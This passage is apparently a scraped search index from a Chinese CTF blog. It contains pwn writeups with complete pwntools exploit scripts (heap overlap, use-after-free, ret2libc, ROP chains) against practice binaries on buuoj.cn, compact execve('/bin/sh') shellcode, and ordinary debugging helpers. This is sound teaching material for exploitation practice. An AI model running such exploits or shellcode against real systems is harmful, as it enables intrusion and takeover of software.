\u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes, newline: bool = True) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) if newline: sendline_after_clean(content) else: send_after_clean(content) allocate(0x18, b\u0026#34;0\u0026#34;) allocate(0x18, b\u0026#34;1\u0026#34;) allocate(0x18, b\u0026#34;2\u0026#34;) payload = flat([ \u0026#34;/bin/sh\\x00\u0026#34;, 0, 0 ]) + p8(0x81) change(0, payload, False) remove(1) allocate(0x70, flat([ pg(0)*8, 8, m_elf.got[\u0026#39;free\u0026#39;] ])) show(2) free_got = recv_and_transform(\u0026#34;Content : \u0026#34;) base_addr = free_got - libc.sym[\u0026#39;free\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( free_got=free_got, base_addr=base_addr, system_addr=system_addr ) change(2, pg(system_addr)) remove(0) interactive_after_clean() ","date":"2023年01月03日","permalink":"https://peterliuzhi.top/writeup/hitcontraining_heapcreator/","section":"writeup","summary":"No man is free who is not master of himself. — Epictetus 原题链接 checksec查看程序架构 ida查看伪C代码 create_heap 分配的chunk结构体包括一个保存size的int，和一个指向其他内存","tags":["pwn","chunk overlap","off by one"],"title":"hitcontraining_heapcreator"},{"categories":["tricks","链接集锦"],"contents":" True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. — Daisaku Ikeda\nGlibc source code (glibc-2.36.9000) - Bootlin，在线查看源码\nIndex of /gnu/glibc，直接从官网下载源码\nGitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily.使用git checkout更换版本\nglibc/glibc/ Source Tree，在线源码浏览器\n","date":"2023年01月03日","permalink":"https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/","section":"tricks","summary":"True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. — Daisaku Ikeda Glibc source code (glibc-2.36.9000) - Bootlin，在线查看源码 Index of /gnu/glibc，直接从官网下载源码 GitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily","tags":["pwn","glibc","源码"],"title":"glibc source code源码"},{"categories":["tricks","链接集锦"],"contents":" Love is the attempt to form a friendship inspired by beauty. — Cicero\nLinux System Calls quick and easy，美化很不错\n可搜索的syscall表，但目前只支持x86_64\nChromium OS Docs - Linux System Call Table，和Linux大致一样，体验不错\nMicrosoft Windows System Call Table (XP/2003/Vista/2008/7/2012/8/10)，阴间审美\nLinux System Call Table for x86 64 · Ryan A. Chapman，个人博客备份\nlinux/syscall_64.tbl at v4.17 · torvalds/linux · GitHub，李纳斯在GitHub上开源的Linux内附的table文件\nlinux/syscall_32.tbl at v4.17 · torvalds/linux · GitHub，李纳斯在GitHub上开源的Linux内附的table文件\nlinux/unistd.h at v4.17 · torvalds/linux · GitHub，arm版本的\nlinux/syscall.tbl at v4.17 · torvalds/linux · GitHub，arm64版本的\nWhere do you find the syscall table for Linux? - Unix \u0026amp; Linux Stack Exchange\n","date":"2023年01月03日","permalink":"https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/","section":"tricks","summary":"Love is the attempt to form a friendship inspired by beauty. — Cicero Linux System Calls quick and easy，美化很不错 可搜索的syscall表，但目前只支持x86_64 Chromium OS Docs - Linux System Call Table，和Linux大致一","tags":["pwn","syscall"],"title":"各平台syscall序号"},{"categories":["tricks"],"contents":" Motivation is the art of getting people to do what you want them to do because they want to do it. — Dwight D. Eisenhower\n初始化arm调试环境 sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarch libc6-arm64-cross 有些Ubuntu版本可能有些库没有，或者更名了，如果仅调试可以只用：\nsudo apt-get install qemu gdbserver gdb-multiarch libc6-arm64-cross 其中libc6-arm64-cross在不同系统名字可能不一样，可以使用以下指令检查：\nsudo apt search \u0026#34;libc6-\u0026#34; | grep \u0026#34;arm\u0026#34; 更多阅读：\narm pwn入门 | blingbling\u0026rsquo;s blog 用qemu在指定端口运行程序并自动用gdb连接该程序 将下列代码保存为脚本ARM，复制到/usr/local/bin/并增加可执行权限，使用方法：\nARM [端口号] [程序名] #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;【用法】$(basename $0) 程序运行的端口号 程序文件名\u0026#34; echo \u0026#34;脚本自动判断32位还是64位，同时设置大小端\u0026#34; echo \u0026#34;程序运行的端口号和程序文件名不得确实，不然脚本不会运行\u0026#34; echo \u0026#34;示例：\u0026#34; echo -e \u0026#34;\\t$(basename $0) 1234 example\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi if [[ -z $1 ]];then echo \u0026#34;缺失端口号！\u0026#34; exit 3 elif [[ ! $1 =~ ^[0-9]+$ ]];then echo \u0026#34;端口号必须是数字！\u0026#34; exit 3 fi if [[ -z $2 ]];then echo \u0026#34;缺失程序名！\u0026#34; exit 4 fi result=`file $2` if [[ ! $result =~ \u0026#34;ARM\u0026#34; ]];then echo \u0026#34;不是ARM架构程序！\u0026#34; exit 1 fi if [[ $result =~ \u0026#34;32-bit\u0026#34; ]];then echo \u0026#34;$1是32位系统\u0026#34; qemu-arm -g $1 $2 \u0026amp; elif [[ $result =~ \u0026#34;64-bit\u0026#34; ]];then echo \u0026#34;$1是64位系统\u0026#34; qemu-aarch64 -L /usr/aarch64-linux-gnu -g $1 $2 \u0026amp; else echo \u0026#34;无法判断架构！\u0026#34; exit 2 fi endian=`readelf -h typo | grep endian` if [[ $endian =~ \u0026#34;little endian\u0026#34; ]];then gdb $2 -ex \u0026#34;set endian little\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; else gdb $2 -ex \u0026#34;set endian big\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; fi ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/pwn%E4%B8%AD%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/","section":"tricks","summary":"Motivation is the art of getting people to do what you want them to do because they want to do it. — Dwight D. Eisenhower 初始化arm调试环境 sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarch libc6-arm64-cross 有些Ubuntu版本可能有些库没有，或者更名了，如果仅","tags":["pwn"],"title":"PWN中调试arm程序"},{"categories":["tricks"],"contents":" The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. — Ralph Abernathy\n有些时候因为栈的原因，程序运行时会破坏shellcode，这时候可以加一堆ret来抬高栈，也可以选择更为简短的shellcode\n32位shellcode shellcode_32 = asm( \u0026#39;\u0026#39;\u0026#39; xor ecx, ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx, esp mov al, 0xb int 0x80 \u0026#39;\u0026#39;\u0026#39; ) 或\nshellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; 效果对比 64位shellcode shellcode_64 = asm( \u0026#39;\u0026#39;\u0026#39; dec eax xor esi, esi push esi dec eax mov edi, 0x6e69622f das das jae 0x76 push edi push esp pop edi push 0x3b pop eax cdq syscall \u0026#39;\u0026#39;\u0026#39; ) 或\nshellcode_64 = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 效果对比 ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/","section":"tricks","summary":"The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. — Ralph Abernathy 有些时候因为栈的原因，程序运行时会破坏shellcode，这时候可以加一堆ret来抬高栈，也可以","tags":["pwn"],"title":"较为简短的shellcode"},{"categories":["tricks","scripts"],"contents":" A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. — William C. Menninger\n使用方法 changelibc 程序文件名 ld名字 libc路径 ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔符代替\n如果不输入ld名字和libc路径，程序会在中途暂停并询问，如果直接回车就代表不改变该项\n注意ld名字是路径+名字，而libc路径是路径，不要加上libc的名字（如./libc/libc.so.6，不要写./libc/libc.so.6，写./libc）\n脚本 #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;【用法】$(basename $0) 程序文件名 ld名字 libc路径\u0026#34; echo \u0026#34;ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔符代替\u0026#34; echo \u0026#34;如果不输入ld名字和libc路径，程序会在中途暂停并询问，如果直接回车就代表不改变该项\u0026#34; echo \u0026#34;注意ld名字是路径+名字，而libc路径是路径，不要加上libc的名字（如./libc/libc.so.6，不要写./libc/libc.so.6，写./libc）\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi filename=$1 while [ -z $filename ]; do echo -n \u0026#34;请输入程序文件的路径：\u0026#34; read filename done ldname=`ldd $filename | grep ld | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` libcname=`ldd $filename | grep libc | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` tmp=\u0026#34;\u0026#34; if [ -z \u0026#34;$2\u0026#34; ]; then echo -n \u0026#34;请输入ld的路径+名字（直接回车以跳过）：\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-interpreter $tmp $filename else echo \u0026#34;不改变原有libc！\u0026#34; fi else if [ \u0026#34;$2\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;不改变原有ld！\u0026#34; else patchelf --set-interpreter $2 $filename fi fi if [ -z \u0026#34;$3\u0026#34; ]; then echo -n \u0026#34;请输入libc的路径，没有名字（直接回车以跳过）：\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-rpath $tmp $filename else echo \u0026#34;不改变原有libc！\u0026#34; fi else if [ \u0026#34;$3\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;不改变原有libc！\u0026#34; else patchelf --set-rpath $3 $filename fi fi ldd $filename ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/patchelf%E6%9B%B4%E6%94%B9libc%E8%84%9A%E6%9C%AC/","section":"tricks","summary":"A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. — William C. Menninger 使用方法 changelibc 程序文件名 ld名字 libc路径 ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔","tags":["pwn","patchelf"],"title":"patchelf更改libc脚本"},{"categories":["writeup"],"contents":" Courage is going from failure to failure without losing enthusiasm. — Winston Churchill\n原题链接\nchecksec查看程序架构 ida查看伪C代码 菜单堆题，只有三个功能，分配空间，释放空间，显示内容，无法在分配了空间后更改空间的内容，这意味着我们要在分配空间的时候就把payload放进去\nallocate 可以看到，分配的空间有两种类型可选：\n一种是字符串型，会分配第二块空间，同时这块空间的大小在0x400以下任选 一种是数字型，不会分配第二块空间，只会分配第一块大小为0xC的空间 同时，我们发现，释放空间和显示内容的函数是存放在第一次分配的空间中的，因此这个结构类似于：\nstruct chunk{ void* show; void* remove; void* content; //因为32位系统中int大小等于指针大小，所以这个content可以复用保存int } 那么我们的思路大概就是通过tcache bin的LIFO原则释放后再分配实现错位，控制两个函数指针后，再通过UAF二次释放chunk\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./ciscn_2019_n_3\u0026#34; libc_name: str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25949\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804899C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index: int, size: int, type: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(type)) if type == 2: sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0xC, 2, \u0026#34;0\u0026#34;) allocate(1, 0x80, 1, \u0026#34;1\u0026#34;) remove(0) remove(1) payload = flat([ \u0026#34;sh\\x00\\x00\u0026#34;, m_elf.plt[\u0026#39;system\u0026#39;] ]) allocate(2, 0xC, 2, payload) remove(0) interactive_after_clean() ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_n_3/","section":"writeup","summary":"Courage is going from failure to failure without losing enthusiasm. — Winston Churchill 原题链接 checksec查看程序架构 ida查看伪C代码 菜单堆题，只有三个功能，分配空间，释放空间，显示内容，无法在分配了空间","tags":["pwn","LIFO错位","UAF","更改chunk内函数指针"],"title":"ciscn_2019_n_3"},{"categories":null,"contents":" Until you make peace with who you are, you will never be content with what you have. — Doris Mortman\n本栏目用于收集各种杂项随笔\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/posts/hello/","section":"posts","summary":"Until you make peace with who you are, you will never be content with what you have. — Doris Mortman 本栏目用于收集各种杂项随笔","tags":null,"title":"Hello"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/search.html/","section":"","summary":"","tags":null,"title":"搜索结果"},{"categories":["writeup"],"contents":" Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. — Octavia E. Butler\n原题链接\nchecksec ida 解题思路很简单，先后调用win_function1、winfunction2、flag函数即可，重要的是rop链的顺序，32位系统比较杂乱\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./PicoCTF_2018_rop_chain\u0026#34; libc_name: str = \u0026#34;/home/ctf/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;28219\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def sendline_after_clean(content: bytes) -\u0026gt; None: p.clean() p.sendline(content) def interactive_after_clean() -\u0026gt; None: p.clean() p.interactive() #需要自行设定offset offset:int = 0x18 + 0x4 payload = flat([ m_elf.sym[\u0026#39;win_function1\u0026#39;], m_elf.sym[\u0026#39;win_function2\u0026#39;], m_elf.sym[\u0026#39;flag\u0026#39;], -1163220307, -559039827 ]) payload = flat({offset : payload}) sendline_after_clean(payload) interactive_after_clean() 调用win1，因为没有参数，所以不用安排栈 等到win1结束时，有一条ret指令，会将win2弹入EIP\n而win2是一个有参数的函数，为了获取栈中参数，32位系统的方法是，使用[ebp+8]作为第一个参数，而ebp的值如下图所示：\n所以参数和指令之间要隔开\nflag函数同理\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/","section":"writeup","summary":"Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. — Octavia E. Butler 原题链接 checksec ida 解题思路很简单，先后调用win_func","tags":["pwn","32位系统传参"],"title":"【32位系统传参】BUUCTF picoctf_2018_rop chain"},{"categories":["writeup"],"contents":" Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. — Peter Drucker\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序架构 $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 我们发现第一次输入的数字决定了第二次输入的字符个数，但是必须小于32，而我们查看过栈情况后发现32个字符是不够的\n然后我们发现get_n的第二个参数的类型为unsigned int：\n那么我们可以考虑符号位漏洞\n构建exp 符号位溢出 我们知道，在计算机中负数是由补码机制表示的 （还有另一种不流行的表示方法，就是把第一位作为符号位，1表示负，0表示正，剩下的位表示数字的绝对值，但这样会产生-0和+0两个0），也就是说，原本如果不考虑负数，我们可以表示0~0xffffffff的正数，但是现在我们把它对半分，用后面那一节表示负数，那么这个数轴就变成了：\n0x80000000 ~ 0xffffffff 0 0x1 ~ 0x7fffffff $-2^{31}$ ~ $-1$ $0$ $1$ ~ $2^{31}-1$ 但是如果我们在C语言中进行数字的比较时，我们是比较的它们逻辑上的值，也就是-1 \u0026lt; 32，尽管-1在计算机内部的数值是大于32的（因为负数实际的值一定是大于等于0x80000000的，所以负数的第一位一定是1，而正数的第一位一定是0，这样我们就可以通过第一位来判断数字的正负了）\n如果我们将-1强制转换为无符号整数，那么它负数的属性就消失了，它逻辑上就是$2^{32}-1$\n这种逻辑上的不一致就产生了符号位漏洞\nret2libc 这题最无语的是它提供了一个do_thing函数：\n我还以为是要用syscall做，浪费了好多时间找能改变eax、ebx、ecx、edx的gadget，结果找了一圈就是没有能改eax的，后来无奈只能用ret2libc做\n这个程序有printf函数，我们通过printf函数泄露基址就好了\n完整exp 需要注意的是，这题的libc在libcdatabase是搜不到的，因此用不了libcsearcher\n可以去BUUCTF的FQA专栏找libc的下载地址\nfrom pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./pwn2_sctf_2016\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485B7\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + pg(m_elf.plt[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;vuln\u0026#39;]) + pg(m_elf.got[\u0026#39;printf\u0026#39;]) p.sendline(payload) p.recvuntil(b\u0026#39;\\n\u0026#39;) printf_addr = u32(p.recv(4)) success(hex(printf_addr)) base_addr = printf_addr - libc.sym[\u0026#39;printf\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] exit_addr: int = base_addr + libc.sym[\u0026#39;exit\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) success(hex(base_addr)) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() ret: int = 0x08048346 payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + \\ pg(system_addr) + pg(exit_addr) + pg(bin_sh_addr) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E+ret2libcpwn2_sctf_2016/","section":"writeup","summary":"Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. — Peter Drucker 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序","tags":["pwn","符号位漏洞","ret2libc"],"title":"【符号位漏洞+ret2libc】pwn2_sctf_2016"},{"categories":["writeup"],"contents":" Never mistake activity for achievement. — John Wooden\n原题链接\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = 